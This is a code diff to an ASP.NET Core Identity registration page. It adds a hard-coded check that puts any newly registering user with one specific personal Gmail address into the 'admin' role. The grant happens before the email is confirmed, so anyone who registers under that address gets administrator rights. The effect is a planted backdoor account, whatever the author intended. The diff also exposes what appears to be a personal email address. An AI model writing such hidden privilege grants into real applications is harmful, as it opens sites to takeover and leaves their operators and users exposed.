@@ -166,6 +166,8 @@ namespace Project.Areas.Identity.Pages.Account
 
                         var userId = await _userManager.GetUserIdAsync(user);
                         var code = await _userManager.GenerateEmailConfirmationTokenAsync(user);
+                        if(user.Email == "kisstomi03@gmail.com")
+                            await _userManager.AddToRoleAsync(user, "admin");
                         code = WebEncoders.Base64UrlEncode(Encoding.UTF8.GetBytes(code));
                         var callbackUrl = Url.Page(
                             "/Account/ConfirmEmail",
